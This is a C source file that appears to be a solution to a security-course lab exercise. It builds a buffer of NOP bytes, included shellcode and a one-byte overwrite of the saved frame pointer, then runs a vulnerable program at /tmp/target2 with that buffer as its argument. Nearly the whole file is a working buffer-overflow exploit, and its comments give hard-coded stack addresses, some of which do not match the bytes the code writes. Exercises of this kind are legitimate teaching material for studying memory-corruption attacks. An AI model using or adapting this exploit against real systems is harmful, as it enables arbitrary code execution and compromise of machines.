#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];
  // expolit is of type: nops shellcode shellcode_add %ebp changing byte
  char buffer[200 + 1]; // 1 for NULL
  memset(buffer, 0x90, 201);


  // EBP is at 0xbffff99c  val changed into: 0xbffff941
  // buffer is 0xbffff8d4
  // Value to be written in the changed ebp si 0x9c - 0x04 (0xbffff998) == 0x98
  //
  // addr to shell code is needed to be placed at 0xbffff998, since we have no
  // ops, that address can be 0xbffff8d8
  // A8 - 4 because of pop instruction.
  buffer[200] = 0xA4;
  buffer[199] = 0xbf;
  buffer[198] = 0xff;
  buffer[197] = 0xfc;
  buffer[196] = 0xf4;

  
  // Add the shellcode
  int i = 196 - strlen(shellcode);
  memcpy(buffer + i, shellcode, strlen(shellcode));
  i = 0;
  for (i = 0; i < sizeof(buffer); i++)
  printf("%2x ", buffer[i]);
  printf("\n");
  args[0] = TARGET; 
  
  args[1] = buffer; 
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}                        
